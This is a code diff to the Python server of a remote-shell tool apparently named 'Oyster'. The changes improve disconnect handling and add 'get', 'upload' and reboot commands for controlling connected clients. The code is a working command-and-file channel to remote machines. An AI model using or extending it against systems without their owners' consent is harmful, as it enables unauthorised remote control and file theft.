@@ -6,7 +6,16 @@ import sys
 import threading
 from uuid import uuid4
 from base64 import b64encode, b64decode
+import shlex
 from client import Client
+
+
+class Event(object):
+    pass
+
+
+class ClientShellDisconnectEvent(Event):
+    pass
 
 
 class Connection(object):
@@ -51,7 +60,8 @@ class Connection(object):
                 self.connection.send(command)
                 self.connection.send(str.encode('~!_TERM_$~'))
         except BrokenPipeError as err_msg:
-            print('Client disconnected... Could not send last command.')
+            print('Client disconnected... Could not send last command.  Type quit into the console.')
+            self.connection.close()
             return
 
         return self.get_response()
@@ -189,7 +199,11 @@ class ConnectionManager(object):
             print('Run the `use` command to select a connection by ip address before sending commands.')
             return ''
 
-        response = self.current_connection.send_command(command, encode=encode)
+        try:
+            response = self.current_connection.send_command(command, encode=encode)
+        except BrokenPipeError as err_msg:
+            self.current_connection = None
+            return
 
         if echo:
             print(response)
@@ -286,6 +300,7 @@ o       O o   O `Ooo.   O   OooO'  o
         self.bind_retry = bind_retry
 
         self.socket = None
+        self.reboot = False
 
         self.connection_mgr = ConnectionManager()
         self.create_socket()
@@ -398,7 +413,7 @@ o       O o   O `Ooo.   O   OooO'  o
         print(the_string, end='')
         return self
 
-    def handle_upload(self):
+    def handle_upload(self, filepaths=None):
         """
         Handle a file upload.
 
@@ -411,15 +426,24 @@ o       O o   O `Ooo.   O   OooO'  o
             connection_id = input('< Enter Client IP or Index > ')
         else:
             connection_id = None
-        local_filepath = expanduser(input('< Local File Path > '))
-        remote_filename = input('< Remote File Name > ')
+
+        # Handle the filepaths variable
+        if filepaths is None:
+            local_filepath = expanduser(input('< Local File Path > '))
+            remote_filepath = input('< Remote File Path > ')
+        else:
+            try:
+                local_filepath, remote_filepath = shlex.split(filepaths)
+            except ValueError as err_msg:
+                print('ValueError handling upload:', err_msg)
+                return
 
         if connection_id is not None:
             connection = self.connection_mgr[connection_id]
         else:
             connection = self.connection_mgr.current_connection
 
-        print(connection.send_command('upload_filename {}'.format(remote_filename)))
+        print(connection.send_command('upload_filepath {}'.format(remote_filepath)))
 
         r = None
         try:
@@ -454,7 +478,7 @@ o       O o   O `Ooo.   O   OooO'  o
         :return:
         """
 
-        filedata = self.connection_mgr.send_command('get file {}'.format(filepath))
+        filedata = self.connection_mgr.send_command('get {}'.format(filepath))
         local_filepath = expanduser(input('< Local File Path > '))
         t = threading.Thread(target=self.write_file_data, args=(local_filepath, filedata))
         t.start()
@@ -472,16 +496,36 @@ o       O o   O `Ooo.   O   OooO'  o
 
             if command == 'quit' or command == 'exit':
                 print('Detaching from client...')
-                self.connection_mgr.send_command('quit')
+                try:
+                    self.connection_mgr.send_command('quit')
+                except (BrokenPipeError, OSError) as err_msg:
+                    pass
                 self.connection_mgr.current_connection = None
                 break
 
-            if command[:9] == 'get file ':
-                filepath = command[9:]
+            if command[:4] == 'get ':
+                filepath = command[4:]
                 self.get_file(filepath)
                 continue
 
-            response = self.connection_mgr.send_command(command)
+            if command[:7] == 'upload ':
+                filepaths = command[7:]
+                print(self.handle_upload(filepaths=filepaths))
+                continue
+
+            if command == 'shell reboot':
+                try:
+                    self.connection_mgr.send_command(command)
+                except BrokenPipeError as err_msg:
+                    self.connection_mgr.current_connection = None
+                    break
+                continue
+
+            try:
+                response = self.connection_mgr.send_command(command)
+            except BrokenPipeError as err_msg:
+                print(err_msg)
+                break
             print(response, end='')
         return
 
@@ -506,6 +550,7 @@ o       O o   O `Ooo.   O   OooO'  o
                 # Use a connection.
                 r = self.connection_mgr.use_connection(command[3:].strip())
                 if r is None:
+                    print('Could not connect to client with given information.')
                     continue
 
                 self.client_shell()
@@ -526,6 +571,11 @@ o       O o   O `Ooo.   O   OooO'  o
             if command == 'quit' or command == 'exit' or command == 'shutdown':
                 self.handle_quit()
                 return False
+
+            if command == 'reboot':
+                print('Rebooting...')
+                self.reboot_self()
+                return
 
             if len(command) > 0:
                 if self.connection_mgr.current_connection is not None:
@@ -608,18 +658,17 @@ if __name__ == '__main__':
     )
 
     connection_accepter = threading.Thread(target=server.accept_connections)
-    oyster_shell = threading.Thread(target=server.open_oyster)
     connection_accepter.setDaemon(True)
-    oyster_shell.setDaemon(True)
 
     connection_accepter.start()
-    oyster_shell.start()
+
+    server.open_oyster()
 
     try:
         connection_accepter.join()
-        oyster_shell.join()
     except:
         server.handle_quit()
         connection_accepter.join()
+
 
     print('Shutdown complete!')
